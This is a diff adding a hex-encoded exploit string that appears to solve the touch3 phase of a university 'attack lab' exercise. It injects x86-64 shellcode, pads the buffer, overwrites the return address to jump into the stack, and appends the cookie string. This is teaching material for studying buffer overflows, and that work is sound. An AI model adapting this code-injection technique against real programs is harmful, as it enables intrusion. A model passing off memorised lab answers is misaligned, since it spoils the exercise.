@@ -1,0 +1,7 @@
+bf a8 dc 61 55       	/* mov    $0x5561dca8,%edi set the edi register to be the address of the string representation of cookie */
+83 ec 08             	/* sub    $0x8,%esp */
+c7 04 24 fa 18 40 00 	/* movl   $0x4018fa,(%rsp) return address to the touch3 */
+c3                   	/* retq   */
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 /* fill in between */
+78 dc 61 55 00 00 00 00 /* return address to the injest code */
+35 39 62 39 39 37 66 61 00 /* string representation of cookie 0x59b997fa */
